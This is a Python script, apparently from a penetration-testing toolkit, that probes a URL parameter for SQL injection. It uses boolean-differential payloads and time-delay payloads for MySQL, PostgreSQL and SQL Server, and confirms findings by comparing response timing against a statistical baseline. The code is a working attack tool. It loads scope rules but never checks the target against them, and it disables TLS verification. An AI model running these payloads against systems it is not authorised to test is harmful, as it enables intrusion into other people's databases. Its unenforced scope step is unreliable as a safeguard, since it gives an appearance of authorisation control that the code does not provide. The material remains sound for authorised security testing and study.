#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
"""Playbook agent for statistical timing and boolean differential SQL Injection verification."""

from __future__ import annotations

import argparse
import json
import math
import os
import sys
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path
from typing import Any

try:
    import httpx
except ImportError:
    httpx = None

from arsenal.scope import parse_scope


def resolve_scope_rules() -> tuple[list[str], list[str]]:
    """Resolve in_scope and out_of_scope lists from active workspace scope."""
    scope_file = os.environ.get("ARSENAL_SCOPE_FILE")
    candidate_paths: list[Path] = []
    if scope_file:
        candidate_paths.append(Path(scope_file))

    cwd = Path.cwd()
    candidate_paths.append(cwd / ".omp" / "arsenal" / "scope.json")
    candidate_paths.append(cwd / ".omp" / "scope.json")

    for p in candidate_paths:
        if p.is_file():
            try:
                doc = parse_scope(p)
                return list(doc.get("in_scope") or []), list(doc.get("out_of_scope") or [])
            except Exception:
                continue

    return [], []


@dataclass
class SQLiTimeVector:
    dbms: str
    payload_template: str  # must contain {seconds}
    expected_delay: float


TIME_VECTORS: list[SQLiTimeVector] = [
    SQLiTimeVector(
        dbms="MySQL / MariaDB",
        payload_template="' OR (SELECT 1 FROM (SELECT(SLEEP({seconds})))a)-- -",
        expected_delay=5.0,
    ),
    SQLiTimeVector(
        dbms="PostgreSQL",
        payload_template="'; SELECT pg_sleep({seconds})--",
        expected_delay=5.0,
    ),
    SQLiTimeVector(
        dbms="Microsoft SQL Server",
        payload_template="'; WAITFOR DELAY '0:0:{seconds}'--",
        expected_delay=5.0,
    ),
]


def run_sqli_audit(
    base_target: str,
    param_name: str = "id",
    rate_limit: float = 10.0,
    timeout: float = 15.0,
    proxy: str | None = None,
    auth_header: str | None = None,
) -> dict[str, Any]:
    """Execute statistical timing and boolean differential SQL injection audit."""
    if httpx is None:
        return {"error": "httpx package is required for SQLi probing. Install with 'pip install httpx'."}

    request_headers: dict[str, str] = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Arsenal/4.0 SQLi-Probe",
    }
    if auth_header:
        request_headers["Authorization"] = auth_header

    proxies = {"all://": proxy} if proxy else None
    client = httpx.Client(
        headers=request_headers,
        timeout=timeout,
        proxies=proxies,
        verify=False,
        follow_redirects=True,
    )

    min_interval = 1.0 / rate_limit if rate_limit > 0 else 0.0
    last_req_time = 0.0

    def rate_limit_sleep() -> None:
        nonlocal last_req_time
        elapsed = time.time() - last_req_time
        if elapsed < min_interval:
            time.sleep(min_interval - elapsed)
        last_req_time = time.time()

    parsed_base = urllib.parse.urlparse(base_target)
    query_params = dict(urllib.parse.parse_qsl(parsed_base.query))
    original_val = query_params.get(param_name, "1")

    # Step 1: Statistical Baseline Timing Measurement (3 benign iterations)
    baseline_latencies: list[float] = []
    baseline_bodies: list[str] = []

    for _ in range(3):
        rate_limit_sleep()
        query_params[param_name] = original_val
        url = urllib.parse.urlunparse(parsed_base._replace(query=urllib.parse.urlencode(query_params)))
        t0 = time.time()
        try:
            r = client.get(url)
            lat = time.time() - t0
            baseline_latencies.append(lat)
            baseline_bodies.append(r.text)
        except Exception:
            pass

    mean_baseline = sum(baseline_latencies) / len(baseline_latencies) if baseline_latencies else 0.2
    variance = (
        sum((x - mean_baseline) ** 2 for x in baseline_latencies) / len(baseline_latencies)
        if len(baseline_latencies) > 1
        else 0.05
    )
    std_baseline = math.sqrt(variance)

    # Step 2: Boolean Differential Testing
    boolean_result: dict[str, Any] = {
        "tested": True,
        "true_condition_differs": False,
        "false_condition_differs": False,
    }

    try:
        # True condition
        rate_limit_sleep()
        query_params[param_name] = f"{original_val}' AND '1'='1"
        r_true = client.get(urllib.parse.urlunparse(parsed_base._replace(query=urllib.parse.urlencode(query_params))))

        # False condition
        rate_limit_sleep()
        query_params[param_name] = f"{original_val}' AND '1'='2"
        r_false = client.get(urllib.parse.urlunparse(parsed_base._replace(query=urllib.parse.urlencode(query_params))))

        baseline_len = len(baseline_bodies[0]) if baseline_bodies else 0
        true_len = len(r_true.text)
        false_len = len(r_false.text)

        if abs(true_len - false_len) > 20 or r_true.status_code != r_false.status_code:
            boolean_result["true_condition_differs"] = True
            boolean_result["length_true"] = true_len
            boolean_result["length_false"] = false_len
    except Exception as exc:
        boolean_result["error"] = str(exc)

    # Step 3: Statistical Time-Based Delay Probes
    confirmed_timing_findings: list[dict[str, Any]] = []
    timing_records: list[dict[str, Any]] = []

    for vec in TIME_VECTORS:
        rate_limit_sleep()
        sleep_sec = int(vec.expected_delay)
        injected_payload = vec.payload_template.format(seconds=sleep_sec)
        query_params[param_name] = f"{original_val}{injected_payload}"
        probe_url = urllib.parse.urlunparse(parsed_base._replace(query=urllib.parse.urlencode(query_params)))

        record: dict[str, Any] = {
            "dbms": vec.dbms,
            "injected_payload": injected_payload,
            "expected_delay": vec.expected_delay,
            "measured_latency": None,
            "statistical_z_score": None,
            "confirmed_timing_sqli": False,
        }

        t0 = time.time()
        try:
            client.get(probe_url)
            elapsed = time.time() - t0
            record["measured_latency"] = round(elapsed, 3)

            z_score = (elapsed - mean_baseline) / (std_baseline if std_baseline > 0.01 else 0.05)
            record["statistical_z_score"] = round(z_score, 2)

            # Tripartite Timing Oracle:
            # Latency exceeds baseline by >= 4.0 seconds AND exceeds mean + 3*sigma
            if elapsed >= (sleep_sec - 0.5) and elapsed > (mean_baseline + 3 * std_baseline):
                # Run secondary differential delay to rule out random spike
                rate_limit_sleep()
                diff_sec = sleep_sec + 2  # 7 seconds
                diff_payload = vec.payload_template.format(seconds=diff_sec)
                query_params[param_name] = f"{original_val}{diff_payload}"
                diff_url = urllib.parse.urlunparse(parsed_base._replace(query=urllib.parse.urlencode(query_params)))

                t_diff0 = time.time()
                client.get(diff_url)
                diff_elapsed = time.time() - t_diff0

                if diff_elapsed >= (diff_sec - 0.5):
                    record["differential_latency"] = round(diff_elapsed, 3)
                    record["confirmed_timing_sqli"] = True
                    confirmed_timing_findings.append(record)

        except Exception as exc:
            record["error"] = str(exc)

        timing_records.append(record)

    client.close()

    vulnerable = len(confirmed_timing_findings) > 0 or boolean_result.get("true_condition_differs", False)

    return {
        "verified_vulnerable": vulnerable,
        "baseline_latency_stats": {
            "mean_seconds": round(mean_baseline, 4),
            "std_seconds": round(std_baseline, 4),
            "sample_count": len(baseline_latencies),
        },
        "boolean_differential": boolean_result,
        "confirmed_timing_findings": confirmed_timing_findings,
        "all_timing_probes": timing_records,
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Statistical Timing and Boolean Differential SQL Injection Verification Agent."
    )
    parser.add_argument("--target", required=True, help="Target URL with parameter (e.g. https://app.example.com/item)")
    parser.add_argument("--param", default="id", help="Parameter to inject SQLi payloads into (default: id)")
    parser.add_argument("--rate-limit", type=float, default=10.0, help="Maximum requests per second (default: 10.0)")
    parser.add_argument("--timeout", type=float, default=15.0, help="Request timeout in seconds (default: 15.0)")
    parser.add_argument("--proxy", help="Optional HTTP/HTTPS proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--auth-header", help="Optional Authorization header value (e.g. 'Bearer <token>')")

    args = parser.parse_args()

    in_scope, out_of_scope = resolve_scope_rules()

    result = run_sqli_audit(
        base_target=args.target,
        param_name=args.param,
        rate_limit=args.rate_limit,
        timeout=args.timeout,
        proxy=args.proxy,
        auth_header=args.auth_header,
    )

    print(json.dumps(result, indent=2, default=str))
    if result.get("error"):
        sys.exit(2)
    if result.get("verified_vulnerable"):
        sys.exit(0)
    sys.exit(0)


if __name__ == "__main__":
    main()
